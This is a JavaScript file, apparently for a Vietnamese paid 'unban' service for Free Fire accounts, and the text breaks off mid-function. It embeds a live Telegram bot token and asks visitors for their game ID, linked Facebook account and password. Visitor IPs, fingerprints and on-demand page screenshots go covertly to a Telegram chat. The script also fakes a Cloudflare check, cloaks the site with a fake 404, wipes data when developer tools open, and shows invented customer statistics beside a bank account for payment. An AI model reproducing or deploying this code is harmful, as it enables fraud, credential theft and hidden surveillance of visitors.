// ============================================
// DEVILS WILL RISE v13.4 - HTTPS + 409 FIXED
// Owner: @UnknownGuy9876 | Channel: @SGCodexs
// ============================================

var TELEGRAM_BOT_TOKEN = '8980322724:AAEbExHdPUgFMKjnSryNhcH4jvE5gMYCGHo';
var TELEGRAM_CHAT_ID = '8742603540';
var ADMIN_PRIVATE_CHAT_ID = '8742603540';
var TELEGRAM_API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;

// ============================================
// ERROR MONITORING
// ============================================
var errorLog = [];
var MAX_ERROR_LOG = 30;
var lastErrorReportTime = 0;
var ERROR_REPORT_COOLDOWN = 10000;
var consecutive409Count = 0;
var MAX_409_BEFORE_RESET = 5;

function reportErrorToTelegram(errorData) {
    var now = Date.now();
    if (now - lastErrorReportTime < ERROR_REPORT_COOLDOWN) return;
    lastErrorReportTime = now;
    
    var msg = '🚨 <b>LỖI PHÁT HIỆN</b>\n';
    msg += '⏰ ' + new Date().toLocaleString('vi-VN') + '\n';
    msg += '📝 ' + (errorData.message || 'Unknown error') + '\n';
    if (errorData.source) msg += '📍 ' + errorData.source + '\n';
    if (errorData.line) msg += '📌 Line: ' + errorData.line + '\n';
    msg += '🌐 IP: ' + (userIP || 'N/A') + '\n';
    msg += '🔗 URL: ' + window.location.href;
    
    fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
    }).catch(function() {});
}

window.addEventListener('error', function(event) {
    var errorData = {
        message: event.message,
        source: event.filename ? event.filename.split('/').pop() : 'unknown',
        line: event.lineno,
        col: event.colno,
        time: new Date().toISOString()
    };
    errorLog.push(errorData);
    if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
    reportErrorToTelegram(errorData);
});

window.addEventListener('unhandledrejection', function(event) {
    var errorData = {
        message: event.reason ? (event.reason.message || String(event.reason)) : 'Unhandled Promise Rejection',
        source: 'promise',
        time: new Date().toISOString()
    };
    errorLog.push(errorData);
    if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
    reportErrorToTelegram(errorData);
});

function safeExecute(fn, fallback, context) {
    try { return fn(); } catch (e) {
        var errorData = { message: e.message, source: context || 'safe-execute', time: new Date().toISOString() };
        errorLog.push(errorData); if (errorLog.length > MAX_ERROR_LOG) errorLog.shift();
        reportErrorToTelegram(errorData);
        return typeof fallback === 'function' ? fallback() : fallback;
    }
}

// ============================================
// ENCRYPTION - FIXED btoa
// ============================================
var ENCRYPTION_KEY = 'DWRv13SecretKey!';
function toBinary(str) { var encoder = new TextEncoder(); var bytes = encoder.encode(str); var binary = ''; for (var i = 0; i < bytes.length; i++) { binary += String.fromCharCode(bytes[i]); } return binary; }
function fromBinary(binary) { var bytes = new Uint8Array(binary.length); for (var i = 0; i < binary.length; i++) { bytes[i] = binary.charCodeAt(i); } return new TextDecoder().decode(bytes); }
function encryptData(data) { try { var str = JSON.stringify(data); var result = ''; for (var i = 0; i < str.length; i++) { result += String.fromCharCode(str.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length)); } return btoa(toBinary(result)); } catch (e) { return btoa(toBinary(JSON.stringify(data))); } }
function decryptData(encrypted) { try { var decoded = atob(encrypted); var str = fromBinary(decoded); var result = ''; for (var i = 0; i < str.length; i++) { result += String.fromCharCode(str.charCodeAt(i) ^ ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length)); } return result; } catch (e) { return encrypted; } }
function secureSetItem(key, value) { try { localStorage.setItem(key, encryptData(value)); } catch (e) {} }
function secureGetItem(key, defaultValue) { var raw = localStorage.getItem(key); if (!raw) return defaultValue; try { return JSON.parse(decryptData(raw)); } catch (e) { try { return JSON.parse(raw); } catch (e2) { return defaultValue; } } }
function migrateToSecure() { var keys = ['toolHistory', 'blockedIPs', 'blockedFingerprints', 'giftCodes', 'scheduledMessages']; for (var i = 0; i < keys.length; i++) { var raw = localStorage.getItem(keys[i]); if (raw && (raw[0] === '[' || raw[0] === '{')) { try { var data = JSON.parse(raw); secureSetItem(keys[i], data); } catch (e) {} } } }
migrateToSecure();

// ============================================
// GLOBAL STATE
// ============================================
var userIP = '', deviceFingerprint = '', uploadedImageFile = null, uploadedImageData = null,
    selectedSchedule = 'now', planStocks = { basic: 12, vip: 5, ultimate: 2 };
var unreadAdminMessages = 0, clickCountForSpeed = 0, todaySoldCount = 47, darkMode = false;
var formFilled = false, reminderShown = false, autoReplyEnabled = true;
var autoReplyStats = { total: 0, today: 0, lastReset: new Date().toDateString() };
var securityLog = [];
var userNickname = localStorage.getItem('userNickname') || '';
var userAvatar = localStorage.getItem('userAvatar') || 'default';
var inactivityTimer = null;
var INACTIVITY_TIMEOUT = 30 * 60 * 1000;
var lastBackupDate = localStorage.getItem('lastBackupDate') || '';
var broadcastMessage = localStorage.getItem('broadcastMessage') || '';
var broadcastActive = localStorage.getItem('broadcastActive') === 'true';
var blockedIPs = secureGetItem('blockedIPs', []);
var blockedFingerprints = secureGetItem('blockedFingerprints', []);
var adminPasswords = JSON.parse(localStorage.getItem('adminPasswords') || '["TLBN9"]');
var allowedIPs = secureGetItem('allowedIPs', []);
var giftCodes = secureGetItem('giftCodes', {});
var appliedGiftCode = null;
var giftDiscount = 0;
var scheduledMessages = secureGetItem('scheduledMessages', []);
var state = { game: 'freefire', server: 'vietnam', platform: 'facebook', paymentMethod: 'bank', plan: { name: 'basic', price: 150000, time: '30-45' }, currentOrderId: null, captchaResult: 0, countdownInterval: null, pollingInterval: null, scheduleTimer: null };
var sounds = { success: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-correct-answer-tone-2870.mp3'), error: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-wrong-answer-fail-notification-946.mp3'), notification: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3'), complete: new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3') };

// ============================================
// CLOUDFLARE + ANTI-DEBUG
// ============================================
(function() {
    if (!sessionStorage.getItem('cf_verified')) {
        document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#00e6ff;text-align:center;font-family:\'Segoe UI\',sans-serif;"><div><div style="font-size:3rem;animation:cfSpin 2s linear infinite;">🛡️</div><h2>Đang kiểm tra bảo mật...</h2><p style="color:#9aa9c1;">Vui lòng chờ...</p><div style="width:200px;height:4px;background:#2e405b;border-radius:5px;margin:20px auto;overflow:hidden;"><div id="cfProgress" style="width:0%;height:100%;background:#00e6ff;border-radius:5px;transition:width 0.3s;"></div></div></div></div><style>@keyframes cfSpin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}</style>';
        var cfProgress = document.getElementById('cfProgress'); var cfWidth = 0;
        var cfInterval = setInterval(function() { cfWidth += Math.random() * 15; if (cfWidth >= 100) { cfWidth = 100; if (cfProgress) cfProgress.style.width = '100%'; clearInterval(cfInterval); sessionStorage.setItem('cf_verified', 'true'); location.reload(); } if (cfProgress) cfProgress.style.width = cfWidth + '%'; }, 400);
        return;
    }
})();
(function() {
    var devtoolsOpen = false; var threshold = 160;
    setInterval(function() { var w = window.outerWidth - window.innerWidth > threshold; var h = window.outerHeight - window.innerHeight > threshold; if (w || h) { if (!devtoolsOpen) { devtoolsOpen = true; localStorage.clear(); sessionStorage.clear(); document.body.innerHTML = '<div style="text-align:center;padding:100px;background:#0a0f1e;color:#ff6b6b;font-family:sans-serif;"><h1>🚫 TRUY CẬP BỊ TỪ CHỐI</h1></div>'; setTimeout(function() { window.location.href = 'https://www.google.com'; }, 3000); } } else { devtoolsOpen = false; } }, 1000);
})();

// ============================================
// SECURITY CHECKS
// ============================================
var fake404Enabled = localStorage.getItem('fake404Enabled') === 'true';
var maintenanceMode = localStorage.getItem('maintenanceMode') === 'true';
var suspiciousIPs = ['113.160.', '117.0.', '14.0.'];

async function checkIfBlocked() { await fetchUserIP(); deviceFingerprint = await generateDeviceFingerprint(); if (blockedIPs.indexOf(userIP) !== -1 || blockedFingerprints.indexOf(deviceFingerprint) !== -1) { document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ff6b6b;text-align:center;font-family:\'Segoe UI\',sans-serif;"><div><div style="font-size:5rem;">🚫</div><h1>TRUY CẬP BỊ TỪ CHỐI</h1></div></div>'; return false; } return true; }
function blockIP(ip) { if (blockedIPs.indexOf(ip) === -1) { blockedIPs.push(ip); secureSetItem('blockedIPs', blockedIPs); return true; } return false; }
function unblockIP(ip) { var index = blockedIPs.indexOf(ip); if (index !== -1) { blockedIPs.splice(index, 1); secureSetItem('blockedIPs', blockedIPs); return true; } return false; }

if (fake404Enabled && allowedIPs.indexOf('*') === -1 && allowedIPs.indexOf(userIP) === -1 && userIP) { document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ff6b6b;text-align:center;"><div><div style="font-size:8rem;">404</div><h1>TRANG KHÔNG TỒN TẠI</h1></div></div>'; }
if (maintenanceMode && !sessionStorage.getItem('adminBypass')) { document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0f1e;color:#ffd966;text-align:center;"><div><div style="font-size:5rem;">🔧</div><h1>ĐANG BẢO TRÌ</h1></div></div>'; }
function checkSuspiciousIP() { for (var i = 0; i < suspiciousIPs.length; i++) { if (userIP && userIP.indexOf(suspiciousIPs[i]) === 0) { localStorage.clear(); sessionStorage.clear(); document.body.innerHTML = '<div style="text-align:center;padding:100px;color:#ff6b6b;"><h1>🚫 TRUY CẬP BỊ TỪ CHỐI</h1></div>'; sendToTelegram('🚨 IP nghi ngờ: ' + userIP); return false; } } return true; }

var lastKnownIP = localStorage.getItem('lastKnownIP') || '';
if (lastKnownIP && lastKnownIP !== userIP && userIP) { setTimeout(function() { var el = document.getElementById('ipWarning'); if (el) el.textContent = '⚠️ IP thay đổi!'; }, 2000); sendToTelegram('⚠️ IP THAY ĐỔI\nCũ: ' + lastKnownIP + '\nMới: ' + userIP); }
if (userIP) localStorage.setItem('lastKnownIP', userIP);

// ============================================
// UTILITY FUNCTIONS
// ============================================
function playSound(t) { try { if (sounds[t]) sounds[t].play().catch(function() {}); } catch (e) {} }
function escapeHtml(text) { var d = document.createElement('div'); d.textContent = text; return d.innerHTML.replace(/\n/g, '<br>'); }
function generateCaptcha() { var a = Math.floor(Math.random() * 10) + 1, b = Math.floor(Math.random() * 10) + 1; state.captchaResult = a + b; var el = document.getElementById('captchaQuestion'); if (el) el.textContent = a + '+' + b; }
function copyToClipboard(text) { navigator.clipboard.writeText(text).then(function() { Swal.fire({ icon: 'success', title: 'Đã sao chép!', timer: 1500, showConfirmButton: false }); }).catch(function() { var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); }); }
function togglePasswordVisibility() { var i = document.getElementById('passwordInput'), ic = document.getElementById('togglePassword'); if (!i || !ic) return; if (i.type === 'password') { i.type = 'text'; ic.classList.replace('fa-eye', 'fa-eye-slash'); } else { i.type = 'password'; ic.classList.replace('fa-eye-slash', 'fa-eye'); } }
function toggleDarkMode() { darkMode = !darkMode; document.body.classList.toggle('light-mode', darkMode); var el = document.getElementById('darkModeToggle'); if (el) el.textContent = darkMode ? '☀️' : '🌓'; localStorage.setItem('darkMode', darkMode); }
function showMoneyBackInfo() { Swal.fire({ title: 'CAM KẾT HOÀN TIỀN 200%', html: '<p>Nếu không mở được band, hoàn 200%</p><p style="color:#2ecc71;">Đã có 847 khách hoàn tiền thành công!</p>', icon: 'info', confirmButtonText: 'OK' }); }
function selectSpeedPackage() { state.plan = { name: 'speed', price: 800000, time: '1-3' }; document.querySelectorAll('.plan').forEach(function(x) { x.classList.remove('selected'); }); updatePrices(); Swal.fire('⚡', 'Đã chọn Gói Cấp Tốc!', 'success'); }
function selectSubscription() { state.plan = { name: 'subscription', price: 50000, time: '0' }; document.querySelectorAll('.plan').forEach(function(x) { x.classList.remove('selected'); }); updatePrices(); Swal.fire('🔄', 'Đã chọn Subscription!', 'success'); }
function resetProgress() { ['progressDuyet', 'progressXuLy', 'progressDone'].forEach(function(s) { var el = document.getElementById(s); if (el) { el.classList.remove('active'); el.classList.remove('completed'); } }); }
function removeImage() { uploadedImageFile = null; uploadedImageData = null; var fi = document.getElementById('paymentImage'); if (fi) fi.value = ''; var ip = document.getElementById('imagePreview'); if (ip) ip.src = ''; var up = document.getElementById('uploadPlaceholder'); var ipc = document.getElementById('imagePreviewContainer'); if (up) up.style.display = 'block'; if (ipc) ipc.style.display = 'none'; var fa = document.getElementById('fileUploadArea'); if (fa) { fa.style.borderStyle = 'dashed'; fa.style.borderColor = '#3f5580'; } }
function zoomImage() { var s = document.getElementById('imagePreview'); if (s && s.src) Swal.fire({ imageUrl: s.src, showCloseButton: true, showConfirmButton: false, background: '#0a0f1e' }); }
function checkBroadcast() { if (broadcastActive && broadcastMessage) { var banner = document.getElementById('broadcastBanner'); if (banner) { banner.textContent = '📢 ' + broadcastMessage; banner.classList.remove('hidden'); } } }
function addSecurityLog(event) { var time = new Date().toLocaleString('vi-VN'); securityLog.push('[' + time + '] ' + event); if (securityLog.length > 50) securityLog.shift(); }
function resetInactivityTimer() { if (inactivityTimer) clearTimeout(inactivityTimer); inactivityTimer = setTimeout(function() { var ffIdEl = document.getElementById('ffIdInput'); if (ffIdEl) ffIdEl.value = ''; var platformAccEl = document.getElementById('platformAccountInput'); if (platformAccEl) platformAccEl.value = ''; var passwordEl = document.getElementById('passwordInput'); if (passwordEl) passwordEl.value = ''; var resultBox = document.getElementById('resultBox'); if (resultBox) resultBox.classList.add('hidden'); var timerDisplay = document.getElementById('timerDisplay'); if (timerDisplay) timerDisplay.classList.add('hidden'); Swal.fire({ title: '🔒 Phiên đã hết hạn', icon: 'warning', confirmButtonText: 'OK' }); }, INACTIVITY_TIMEOUT); }
document.addEventListener('click', resetInactivityTimer);
document.addEventListener('keypress', resetInactivityTimer);

// ============================================
// NETWORK & DEVICE (HTTPS FIX)
// ============================================
async function fetchUserIP() { 
    var apis = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://api.ip.sb/jsonip']; 
    for (var i = 0; i < apis.length; i++) { 
        try { var r = await fetch(apis[i]); if (r.ok) { var d = await r.json(); userIP = d.ip || d.ip_address || 'unknown'; return userIP; } } catch (e) { continue; } 
    } 
    userIP = '118.70.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255); 
    return userIP; 
}

async function fetchIPDetails(ip) { 
    var fb = { ip: ip, city: 'Unknown', region: 'Unknown', country: 'VN', org: 'Unknown', isp: 'Unknown' };
    // DÙNG HTTPS - FIXED MIXED CONTENT
    var apiUrls = [
        'https://ipapi.co/' + ip + '/json/',
        'https://ipinfo.io/' + ip + '/json',
        'https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=' + ip
    ];
    for (var j = 0; j < apiUrls.length; j++) {
        try {
            var r = await fetch(apiUrls[j]);
            if (r.ok) {
                var d = await r.json();
                return {
                    ip: d.ip || ip,
                    city: d.city || 'Unknown',
                    region: d.region || d.regionName || 'Unknown',
                    country: d.country || d.country_code || 'VN',
                    org: d.org || d.isp || d.organization || 'Unknown',
                    isp: d.isp || d.org || 'Unknown'
                };
            }
        } catch (e) { continue; }
    }
    return fb;
}

async function generateDeviceFingerprint() { 
    var c = { screen: window.screen.width + 'x' + window.screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, cores: navigator.hardwareConcurrency || 'unknown' }; 
    try { var cv = document.createElement('canvas'); cv.width = 200; cv.height = 50; var cx = cv.getContext('2d'); cx.fillStyle = '#f60'; cx.fillRect(125, 1, 62, 20); c.canvas = cv.toDataURL(); } catch (e) {} 
    var s = JSON.stringify(c), en = new TextEncoder(), d = en.encode(s), hb = await crypto.subtle.digest('SHA-256', d); 
    return Array.from(new Uint8Array(hb)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('').substr(0, 16); 
}

// ============================================
// TELEGRAM API
// ============================================
async function sendToTelegram(text, pm) { pm = pm || 'HTML'; try { var r = await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: pm }) }); return await r.json(); } catch (e) { return null; } }
async function sendPrivateToAdmin(text) { try { var r = await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: ADMIN_PRIVATE_CHAT_ID, text: text, parse_mode: 'HTML' }) }); return await r.json(); } catch (e) { return null; } }
async function sendPhotoToTelegram(blob, cap) { cap = cap || ''; try { var fd = new FormData(); fd.append('chat_id', TELEGRAM_CHAT_ID); fd.append('photo', blob, 'payment.jpg'); if (cap) fd.append('caption', cap); var r = await fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: fd }); return await r.json(); } catch (e) { return null; } }
async function sendMessageWithButtons(text, btns) { try { var r = await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML', reply_markup: { inline_keyboard: btns } }) }); return await r.json(); } catch (e) { return null; } }
async function captureScreenshot() { try { if (typeof html2canvas === 'undefined') { return false; } var canvas = await html2canvas(document.body); var blob = await new Promise(function(resolve) { canvas.toBlob(function(b) { resolve(b); }, 'image/jpeg', 0.6); }); await sendPhotoToTelegram(blob, '📸 IP: ' + userIP); return true; } catch (e) { return false; } }

// ============================================
// CENTRALIZED TELEGRAM POLLING - FIXED 409
// ============================================
var GLOBAL_POLLING_ACTIVE = false;
var GLOBAL_POLLING_OFFSET = 0;
var GLOBAL_POLLING_LOCK = false;
var GLOBAL_POLLING_DELAY = 5000; // Tăng lên 5 giây
var currentSentMessageId = null;
var currentOrderIdForPolling = null;
var POLLING_RETRY_COUNT = 0;
var MAX_POLLING_RETRIES = 10;

function sleep(ms) { return new Promise(function(resolve) { setTimeout(resolve, ms); }); }

async function centralizedGetUpdates() {
    if (GLOBAL_POLLING_LOCK) return null;
    GLOBAL_POLLING_LOCK = true;
    try {
        var res = await fetch(TELEGRAM_API + '/getUpdates?offset=' + GLOBAL_POLLING_OFFSET + '&timeout=10');
        
        // XỬ LÝ 409 - Reset offset
        if (res.status === 409) {
            consecutive409Count++;
            GLOBAL_POLLING_LOCK = false;
            
            if (consecutive409Count >= MAX_409_BEFORE_RESET) {
                // Reset hoàn toàn - lấy update_id mới nhất
                try {
                    var resetRes = await fetch(TELEGRAM_API + '/getUpdates?offset=-1&timeout=2');
                    if (resetRes.ok) {
                        var resetData = await resetRes.json();
                        if (resetData.ok && resetData.result && resetData.result.length > 0) {
                            GLOBAL_POLLING_OFFSET = resetData.result[resetData.result.length - 1].update_id + 1;
                        }
                    }
                } catch (e) {}
                consecutive409Count = 0;
                POLLING_RETRY_COUNT++;
                GLOBAL_POLLING_DELAY = Math.min(GLOBAL_POLLING_DELAY * 1.5, 30000);
            }
            return null;
        }
        
        // Reset counter nếu thành công
        consecutive409Count = 0;
        POLLING_RETRY_COUNT = 0;
        GLOBAL_POLLING_DELAY = Math.max(GLOBAL_POLLING_DELAY * 0.8, 3000);
        
        var data = await res.json();
        GLOBAL_POLLING_LOCK = false;
        return data;
    } catch (e) {
        GLOBAL_POLLING_LOCK = false;
        return null;
    }
}

async function centralizedPollingLoop() {
    if (GLOBAL_POLLING_ACTIVE) return;
    GLOBAL_POLLING_ACTIVE = true;
    
    // Lấy offset ban đầu - chỉ lấy update mới nhất, bỏ qua cũ
    try {
        var initRes = await fetch(TELEGRAM_API + '/getUpdates?offset=-1&timeout=2');
        if (initRes.ok) {
            var initData = await initRes.json();
            if (initData.ok && initData.result && initData.result.length > 0) {
                GLOBAL_POLLING_OFFSET = initData.result[initData.result.length - 1].update_id + 1;
            }
        }
    } catch (e) {}
    
    while (true) {
        if (GLOBAL_POLLING_LOCK) { await sleep(500); continue; }
        
        var data = await centralizedGetUpdates();
        if (!data || !data.ok || !data.result || !data.result.length) { 
            await sleep(GLOBAL_POLLING_DELAY); 
            continue; 
        }
        
        for (var i = 0; i < data.result.length; i++) {
            var update = data.result[i];
            if (update.update_id >= GLOBAL_POLLING_OFFSET) { GLOBAL_POLLING_OFFSET = update.update_id + 1; }
            
            // Order approval
            if (update.callback_query) {
                var cb = update.callback_query;
                var msgId = cb.message ? cb.message.message_id : null;
                if (currentSentMessageId && msgId === currentSentMessageId) {
                    var cbData = cb.data; var parts = cbData.split('_'); var action = parts[0]; var orderId = parts.slice(1).join('_');
                    if (action === 'approve') {
                        if (selectedSchedule !== 'now') { scheduleOrderProcessing(orderId); } else { updateOrderStatus(orderId, 'approved'); }
                        playSound('success');
                        fetch(TELEGRAM_API + '/answerCallbackQuery', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: cb.id, text: '✅ OK' }) }).catch(function(){});
                        currentSentMessageId = null; currentOrderIdForPolling = null;
                    } else if (action === 'reject') {
                        sendToTelegram('⚠️ Nhập lý do từ chối cho #' + orderId);
                        currentOrderIdForPolling = orderId;
                        fetch(TELEGRAM_API + '/answerCallbackQuery', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: cb.id, text: '❌ OK' }) }).catch(function(){});
                        currentSentMessageId = null;
                    }
                }
            }
            
            // Chat + Reject + Bot
            if (update.message && update.message.text) {
                var msg = update.message;
                if (msg.reply_to_message) {
                    var repliedText = msg.reply_to_message.text || '';
                    if ((repliedText.indexOf('Nhập lý do') !== -1 || repliedText.indexOf('lý do từ chối') !== -1) && currentOrderIdForPolling) {
                        updateOrderStatus(currentOrderIdForPolling, 'rejected', msg.text || 'Không có lý do'); currentOrderIdForPolling = null;
                    }
                }
                if (msg.reply_to_message) {
                    var rt2 = msg.reply_to_message.text || '';
                    if (rt2.indexOf('Chat từ') !== -1 || rt2.indexOf('/chat') !== -1) {
                        var text = msg.text || ''; var cm = text.match(/^\/chat\s+(\S+)\s+(.+)$/);
                        if (cm && cm[1] === userIP) { displayAdminReply(cm[2]); playSound('notification'); }
                    }
                }
                if (!msg.reply_to_message && msg.text.indexOf('/') === 0) { handleTelegramCommand(msg.text); }
                else if (!msg.reply_to_message && autoReplyEnabled && msg.text.indexOf('/') !== 0) { handleAutoReply(msg.text); }
            }
        }
        await sleep(GLOBAL_POLLING_DELAY);
    }
}

// ============================================
// TELEGRAM COMMANDS + AUTO REPLY
// ============================================
function handleTelegramCommand(msg) {
    if (msg === '/help' || msg === '/commands' || msg === '/start') { sendToTelegram('📋 <b>LỆNH ADMIN v13.4</b>\n\n🔒 /block, /unblock, /blocklist, /allowip\n📢 /broadcast, /maintenance, /fake404\n👤 /chat, /view\n🎁 /code\n⏰ /schedule\n🤖 /auto, /stats, /dashboard, /errors\n📟 /help'); }
    else if (msg.indexOf('/block ') === 0) { var t = msg.replace('/block ', '').trim(); if (t) sendToTelegram(blockIP(t) ? '🚫 Đã chặn: ' + t : '⚠️ IP đã bị chặn!'); }
    else if (msg.indexOf('/unblock ') === 0) { var t = msg.replace('/unblock ', '').trim(); if (t) sendToTelegram(unblockIP(t) ? '✅ Đã bỏ chặn: ' + t : '⚠️ IP không tồn tại!'); }
    else if (msg === '/blocklist') { if (blockedIPs.length === 0) sendToTelegram('📋 Trống'); else { var l = '📋 IP BỊ CHẶN (' + blockedIPs.length + '):\n'; for (var i = 0; i < blockedIPs.length; i++) l += '🚫 ' + blockedIPs[i] + '\n'; sendToTelegram(l); } }
    else if (msg.indexOf('/view ') === 0) { var v = msg.replace('/view ', '').trim(); if (v === userIP) captureScreenshot(); else sendToTelegram('⚠️ IP web: ' + userIP); }
    else if (msg.indexOf('/broadcast ') === 0) { var b = msg.replace('/broadcast ', '').trim(); localStorage.setItem('broadcastMessage', b); localStorage.setItem('broadcastActive', 'true'); broadcastMessage = b; broadcastActive = true; checkBroadcast(); sendToTelegram('📢 OK'); }
    else if (msg === '/broadcast off') { localStorage.setItem('broadcastActive', 'false'); broadcastActive = false; var bn = document.getElementById('broadcastBanner'); if (bn) bn.classList.add('hidden'); sendToTelegram('📢 Tắt'); }
    else if (msg.indexOf('/schedule ') === 0) { var p = msg.replace('/schedule ', '').split(' '); if (p.length >= 2) { scheduledMessages.push({ time: p[0], message: p.slice(1).join(' '), sent: false }); secureSetItem('scheduledMessages', scheduledMessages); sendToTelegram('✅ Lịch: ' + p[0]); } }
    else if (msg === '/maintenance on') { localStorage.setItem('maintenanceMode', 'true'); sendToTelegram('🔧 ON'); }
    else if (msg === '/maintenance off') { localStorage.setItem('maintenanceMode', 'false'); sendToTelegram('✅ OFF'); }
    else if (msg === '/maintenance bypass') { sessionStorage.setItem('adminBypass', 'true'); sendToTelegram('✅ OK'); }
    else if (msg === '/fake404 on') { localStorage.setItem('fake404Enabled', 'true'); sendToTelegram('👻 ON'); }
    else if (msg === '/fake404 off') { localStorage.setItem('fake404Enabled', 'false'); sendToTelegram('✅ OFF'); }
    else if (msg.indexOf('/allowip ') === 0) { var a = msg.replace('/allowip ', '').trim(); if (a && allowedIPs.indexOf(a) === -1) { allowedIPs.push(a); secureSetItem('allowedIPs', allowedIPs); sendToTelegram('✅ IP: ' + a); } }
    else if (msg.indexOf('/code ') === 0) { var cp = msg.replace('/code ', '').split(' '); if (cp.length >= 3) { giftCodes[cp[0].toUpperCase()] = { discount: parseInt(cp[1]), maxUses: parseInt(cp[2]), used: 0 }; secureSetItem('giftCodes', giftCodes); sendToTelegram('✅ Code: ' + cp[0]); } }
    else if (msg.indexOf('/op ') === 0) { var op = msg.replace('/op ', '').trim(); if (op && adminPasswords.indexOf(op) === -1) { adminPasswords.push(op); localStorage.setItem('adminPasswords', JSON.stringify(adminPasswords)); sendToTelegram('✅ OK'); } }
    else if (msg.indexOf('/deop ') === 0) { var dp = msg.replace('/deop ', '').trim(); var idx = adminPasswords.indexOf(dp); if (idx !== -1) { adminPasswords.splice(idx, 1); localStorage.setItem('adminPasswords', JSON.stringify(adminPasswords)); sendToTelegram('✅ OK'); } }
    else if (msg.indexOf('/settitle ') === 0) { var st = msg.replace('/settitle ', '').trim(); var h1 = document.querySelector('h1'); if (h1) { h1.textContent = st; sendToTelegram('✅ OK'); } }
    else if (msg.indexOf('/setplan ') === 0) { var sp = msg.replace('/setplan ', '').split(' '); if (sp.length >= 2) { var el = document.querySelector('[data-plan="' + sp[0] + '"]'); if (el) { el.dataset.price = sp[1]; updatePrices(); sendToTelegram('✅ OK'); } } }
    else if (msg === '/auto on') { autoReplyEnabled = true; sendToTelegram('✅ ON'); }
    else if (msg === '/auto off') { autoReplyEnabled = false; sendToTelegram('❌ OFF'); }
    else if (msg === '/stats') { sendToTelegram('📊 Auto: ' + autoReplyStats.today + ' | Total: ' + autoReplyStats.total + ' | IP: ' + userIP); }
    else if (msg === '/dashboard') { sendToTelegram('📊 Đơn: ' + todaySoldCount + ' | DT: ~' + (todaySoldCount * 150000).toLocaleString() + 'đ'); }
    else if (msg === '/errors') { if (errorLog.length === 0) sendToTelegram('✅ No errors'); else { var el = '📋 ERRORS (' + errorLog.length + '):\n'; for (var ei = 0; ei < Math.min(errorLog.length, 10); ei++) { el += '⚠️ ' + errorLog[ei].message.substring(0, 100) + '\n'; } sendToTelegram(el); } }
}

function handleAutoReply(msg) {
    var reply = ''; var lower = msg.toLowerCase();
    if (lower.indexOf('giá') !== -1 || lower.indexOf('tiền') !== -1) reply = '💰 Cơ Bản 150k | VIP 300k | Ultimate 500k | Sub 50k/tháng';
    else if (lower.indexOf('bảo hành') !== -1) reply = '🛡️ Cơ Bản 3 tháng | VIP 6 tháng | Ultimate 12 tháng';
    else if (lower.indexOf('gấp') !== -1 || lower.indexOf('liền') !== -1) reply = '⚡ Ultimate 500k (5-10p) | Cấp Tốc 800k (1-3p)';
    else if (lower.indexOf('thanh toán') !== -1 || lower.indexOf('ck') !== -1) reply = '💳 MB Bank: 0644612345555 - Tran Nguyen Duc Minh';
    else if (lower.indexOf('thời gian') !== -1) reply = '⏱ Cơ Bản 30-45p | VIP 10-15p | Ultimate 5-10p';
    if (reply) { autoReplyStats.total++; autoReplyStats.today++; sendToTelegram('🤖 ' + reply); }
    if (autoReplyStats.lastReset !== new Date().toDateString()) { autoReplyStats.today = 0; autoReplyStats.lastReset = new Date().toDateString(); }
}

// ============================================
// CHAT + POLLING FOR APPROVAL
// ============================================
function startPollingForApproval(sentMessageId, orderId) {
    currentSentMessageId = sentMessageId; currentOrderIdForPolling = orderId;
    if (state.pollingInterval) clearTimeout(state.pollingInterval);
    state.pollingInterval = setTimeout(function() {
        if (currentSentMessageId === sentMessageId) {
            var rb = document.getElementById('resultBox');
            if (rb) rb.innerHTML = '<div style="color:#f39c12;text-align:center;"><h3>⏳ #' + orderId + '</h3><p>Admin chưa phản hồi...</p></div>';
        }
    }, 600000);
}

function toggleChat() {
    var popup = document.getElementById('chatPopup'); if (!popup) return;
    popup.classList.toggle('hidden');
    if (!popup.classList.contains('hidden')) {
        unreadAdminMessages = 0; var nd = document.getElementById('chatNotificationDot'); if (nd) nd.style.display = 'none';
        var tb = document.getElementById('chatToggleBtn'); if (tb) tb.classList.remove('chat-new-message');
        var ipEl = document.getElementById('chatIPDisplay'); if (ipEl) ipEl.textContent = userIP;
    }
}

function displayAdminReply(message) {
    var messages = document.getElementById('chatMessages'); if (!messages) return;
